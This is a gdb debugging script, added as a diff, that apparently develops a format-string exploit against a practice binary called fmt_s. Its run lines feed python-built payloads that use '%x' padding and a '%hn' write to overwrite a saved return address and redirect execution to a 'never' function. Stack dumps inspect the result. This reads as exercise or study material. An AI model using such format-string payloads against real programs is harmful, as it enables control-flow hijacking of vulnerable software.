@@ -1,0 +1,23 @@
+file fmt_s
+break *main+90
+break never
+break *never+0
+## echo rets to  0x56555777 @ stack addr 0xffffd610 i want to redir to 0x56555796
+break *echo+95
+break *echo+102
+break *echo+107
+#r `python -c 'print "\x6c\xd6\xff\xff"+"%x"*10+"a"*0x56c4+"%hn"'`
+#r `python -c 'print "\x2c\x7f\xff\xff"+"%x"*3+"a"*(0x5796-24)+"%hn"'`
+r `python -c 'print "\xdc\x7e\xff\xff"+"%x"*3+"a"*(0x5796-24)+"%hn"'`
+c
+## Before printf
+x/50wx $esp
+x/50wx ($esp+22358)
+x/50wx ($esp+29980)
+
+c
+x/50wx $esp
+x/50wx ($esp+49980)
+c
+x/50wx $esp
+x/50wx ($esp+49980)
